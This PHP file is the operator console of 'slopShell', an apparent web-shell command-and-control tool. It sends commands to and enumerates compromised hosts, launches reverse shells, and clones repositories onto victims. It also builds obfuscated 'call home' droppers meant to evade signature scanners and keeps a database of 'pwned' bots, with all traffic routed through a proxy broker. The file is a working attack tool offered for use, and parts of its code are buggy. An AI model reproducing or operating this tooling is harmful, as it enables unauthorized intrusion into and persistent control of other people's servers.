<?php
posix_setuid(getmyuid());
require "includes/db/postgres_checker.php";
require "includes/droppers/dynamic_generator.php";
$cof = array(
    "useragent"=> "sp1.1",
    "proxy"=> "127.0.0.1:8090",
    "host"=>"127.0.0.1",
    "port"=>"5432",
    "username"=>"postgres",
    "password"=>"",
    "dbname"=>"sloppy_bots"
);

pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);

try{
    define("CHH", curl_init());
    curl_setopt(CHH, CURLOPT_USERAGENT,       config['useragent']);
    curl_setopt(CHH, CURLOPT_PROXY,           config["proxy"]);
}catch (Exception $e){
    print("{$e}\n\n");
}
define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']));

function logo($last, $cl){
    if ($last === "q"){
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");

    }else if (is_null($last))  {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        menu();
    }else{
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
        menu();
    }

}

function menu()
{
    echo <<< _MENU
        (O)ptions                                                                   
        (S)ystem enumeration                                                        
        (R)everse shell                                                             
        (C)ommand Execution                                                         
        (CL)oner
        (CR)eate Dropper                                                                  
        (U)pdates  -> not implemented yet.                                                                 
        (A)dd new host                                                              
        (CH)eck if hosts are still pwned                                            
        (M)ain menu                                                                 
        (Q)uit                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function opts(){
    print("\n\nCurrent options enabled:\n\n");
    foreach (config as $temp=>$values){
        print($temp." => ".$values."\n");
    }
    print("\n".str_repeat("-", 35) . "\n");
    print("\n\nCurrent DB Status:\n\n");
    if (ppg == PGSQL_CONNECTION_OK or ppg == PGSQL_CONNECTION_AUTH_OK){
        print("\nConnected!");
        print("\nPG Host: ". pg_host(ppg));
        print("\nPG Port: ". pg_port(ppg));
        print("\nPG Ping? ". pg_ping(ppg));
    }else{
        print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
    }
    print("\n".str_repeat("-", 35) . "\n");
    print("\n\nProxybroker?\n\n");
    print(system("ps aux | grep proxybroker")."\n");
}

function sys($host, $uri)
{
    if (!empty($host) && !empty($userA)) {
        curl_setopt(CHH, CURLOPT_URL,               "$host/$uri?qs=cqBS");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function rev($host, $shell, $port, $os)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host) and isset($port)) {
        if ($port === "default" && $shell === "default" && $os === "win") {
            $usePort = "1634";
            $Ushell = "cmd";
        } elseif($os === "lin") {
            $usePort = "1634";
            $Ushell = "bash";
        }else{
            $Ushell = $shell;
            $usePort = $port;
        }
        if (!is_null($Ushell)){
            echo "[ !! ] Setting custom options: \n";
            echo "Shell: ".$Ushell."\n";
            echo "OS: ". $os."\n";
        }
        echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
    }

}

function co($command, $host, $uri)
{
    if (!empty($host) && !empty($command) && !empty($uri)) {
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    if (!empty($host) && !empty($repo) && !empty($uri)){
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,               "clone=$repo");
        $re = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)){
                case 200:
                    return $re;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }
        }else{
            return 0;
        }
    }else{
        return 0;
    }

}

function createDropper($callHome, $duration, $obfsucate, $depth){
    echo "Starting dropper creation\n";
    $file_in = "includes/base.php";
    $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
    $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
    $t = new dynamic_generator();
    if ((int)$depth > 23) {
        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n");
        $depth = 23;
    }else{
        print("Trying randomness with {$depth}\n");
    }
    if (!empty($callHome) && !empty($duration) && !empty($depth)){
        try{
            switch (strtolower($obfsucate)){
                case "y":
                    print("Generated dropper will be: {$ob}\n");
                    $t->begin_junk($file_in, $depth, $ob, "ob");
                    system("ls -lah includes/droppers/dynamic/obfuscated");
                    break;
                default:
                    print("Generated Dropper will be: {$n}\n");
                    $t->begin_junk($file_in, "0", $n, "n");
                    system("ls -lah includes/droppers/dynamic/raw");
            }

        }catch (Exception $exception){
            throw new Exception("Could not create dropper.\n");
        }

    }
}

function aHo($host)
{
    $t = new postgres_checker();
    if (!empty($host)){
        if ($t->insertHost($host) != 0){
            echo "Successfully added: $host";
        }else{
            echo "There was an error. Double checking the database.";
            if (!$t->checkDB()){
                echo "There is a sevre error in the db, you need to ensure you have it crated.";
                echo "Attempting to re-create or create the DB.";
                if ($t->createDB()){
                    echo "Created the db successfully! Please re run this command to insert the new host.";
                }
            }else{
                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                $t->getRecord($host);
            }
        }
    }
}

function check($host, $path, $batch)
{
    if (!empty($batch)){
        switch ($batch){
            case "y":
                $c = pg_exec(DBCONN, "SELECT rhost,uri FROM public.postgres.sloppy_bots WHERE NOT NULL OR NOT '-'");
                $count = pg_exec(DBCONN, 'SELECT COUNT(*) FROM (SELECT rhost from public.postgres.sloppy_bots WHERE rhost IS NOT NULL) AS TEMP');
                echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
                curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                foreach (pg_fetch_all($c) as $r){
                    if (!empty($r)){
                        curl_setopt(CHH, CURLOPT_URL,                "$r[0]/$r[1]?qs=cqS");
                        $syst = curl_exec(CHH);
                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                            switch ($syst){
                                case 200:
                                    echo "Host is still ours!\n";
                                    break;
                                case 404:
                                    echo "Looks like our shell was caught... sorry..\n";
                                    break;
                                case 500:
                                    echo "Your useragent was not the correct one... did you forget??\n";
                                    break;
                                default:
                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                    break;
                            }
                        }

                    }
                }
                break;
            case "n":
                if (!empty($host) && !empty($path)){
                    curl_setopt(CHH, CURLOPT_URL,               "$host/$path?qs=cqS");
                    curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                    $syst = curl_exec(CHH);
                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                        switch ($syst){
                            case 200:
                                echo "Host is still ours!\n";
                                break;
                            case 404:
                                echo "Looks like our shell was caught... sorry..\n";
                                break;
                            case 500:
                                echo "Your useragent was not the correct one... did you forget??\n";
                                break;
                            default:
                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                break;
                        }
                    }
                }
        }
    }
}

function queryDB($host, $fetchWhat){
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host) | $host != 0){
        try {
            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
            switch(strtolower($fetchWhat)){
                case "r":
                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM public.postgres.sloppy_bots WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
                default:
                    $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM public.postgres.sloppy_bots WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
            }
            if (!empty($row)){
                return $row[0];
            }else{
                return 0;
            }
        }catch (Exception $e){
            return $e;
        }


    }else {
        throw new Exception("Host was 0, are you sure you added it into the DB?\n");
    }
}

(strtolower(php_uname()) == "windows") ? $clears='cls':$clears="clear";
$run = true;
logo($lc = null, $clears);
while ($run) {
    print("\n\033[33;40mPlease select your choice: \n->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    $lc = $pw;
    logo($lc, $clears);
    switch (strtolower($pw)) {
        case "cr":
            system($clears);
            echo("Where are we calling home to? (hostname/ip)->");
            $h_name = trim(fgets(STDIN));
            echo("How often should we call home? (int) ->");
            $d_int = trim(fgets(STDIN));
            echo("Do we need to obfuscate? (y/n) ->");
            $osb = trim(fgets(STDIN));
            echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
            $de = trim(fgets(STDIN));
            createDropper($h_name, $d_int, $osb, $de);
            break;
        case "s":
            system($clears);
            $h = readline("Which host are we checking?\n->");
            try {
                sys($h, queryDB($h, "s"));
            }catch (Exception $e){
                logo($clears, "s");
                echo $e."\n";
            }
            break;
        case "r":
            system($clears);
            $h = readline("Please tell me the host.\n->");
            $p = readline("\nWhich port shall we use?\n->");
            try {
                $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
            } catch (Exception $e) {
                logo($lc, $clears);
                echo $e."\n";
            }
            echo $o;
            if (!empty($h) && !empty($p)){
                rev($host=$h,"default", $port=$p, $o);
            }
            break;
        case "c":
            system($clears);
            try{
                $h = readline("Which host are we sending the command to?\n->");
                $c = readline("And now the command: \n->");
                co($c, $h, queryDB($h, 'c'));
            }catch (Exception $e){
                logo($lc, $clears);
                echo $e."\n";
            }
            break;
        case "cl":
            system($clears);
            try{
                $h = readline("Which host are we interacting with?\n->");
                $rep = readline("Repo to clone?\n->");
                clo($h, $rep, queryDB($h, "cl"));
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "u":
            system($clears);
            echo "Will be in future editions.\n";
            break;
        case "a":
            system($clears);
            try{
                $h = readline("Who did we pwn my friend?\n->");
                aHo($h);
            }catch (Exception $e){
                logo($lc, $clears);
                echo $e."\n";
            }
            break;
        case "ch":
            system($clears);
            try{
                $h = readline("Who is it we need to check on?\n->");
                $b = readline("Is this going to be a batch job?(Y/N)\n->");
                switch (!empty(strtolower($b))){
                    case "n":
                        echo "Not executing batch job.\n";
                        check($h, queryDB($h, "ch"), "n");
                        break;
                    case "y":
                        echo "Executing batch job!\n";
                        check($h, queryDB($h, "ch"), "y");
                        break;
                    default:
                        echo "Your host was empty, sorry but I will return you to the previous menu.\n";
                        break;
                }
            }catch (Exception $e){
                logo($lc, $clears);
                echo $e."\n";
            }
            break;
        case "m":
            logo($lc, $clears);
            break;
        case "q":
            logo($lc, $clears);
            system("killall proxybroker");
            print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
            echo "  Good bye!\033[0m\n";
            $run = false;
            break;
        case "o":
            opts();
            break;
        default:
            logo($lc, $clears);
            echo "\033[33;40myou need to select a valid option...\033[0m\n";
    }
}

